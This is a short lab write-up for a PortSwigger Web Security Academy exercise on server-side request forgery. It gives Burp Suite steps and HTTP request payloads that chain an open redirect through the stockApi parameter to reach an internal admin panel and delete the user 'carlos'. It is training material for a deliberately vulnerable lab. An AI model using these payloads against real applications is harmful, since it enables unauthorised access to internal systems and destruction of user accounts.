# [SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)

**note: workaround explanation [here](?file=portswigger/basic/ssrf)**

> exploiting open redirect for internal system access

- have burp suite open
- open the application, and browse around the page
- on the production page send a 'stock check' request
- click the "Next product" link
- check the history of the requests

> requirements for the exploit

- need a server side request `stockApi` ('stock check' request)
- need a open redirect path ("Next product" link)

> exploit itself

- send the `/product/stock` to the repeater
- check the path for the `/product/nextProduct?currentProductId=3&path=/product?productId=4`
- the `path=/product?productId=4` part executes the redirect on the server
- change it to

```
path=http://192.168.0.12:8080/admin
```

- so the whole url will look like

```
/product/nextProduct?currentProductId=3&path=http://192.168.0.12:8080/admin
```

- add that to the `/product/stock` requests `stockApi`

```
POST /product/stock HTTP/2
...
stockApi=/product/nextProduct?currentProductId=3&path=http://192.168.0.12:8080/admin
```

- it will return the admin profile delete page
- check for the `carlos` section
- add the `carlos` delete link to the `stockApi` url

```
POST /product/stock HTTP/2
...
stockApi=/product/nextProduct?currentProductId=3&path=http://192.168.0.12:8080/admin/delete?username=carlos
```

- send it
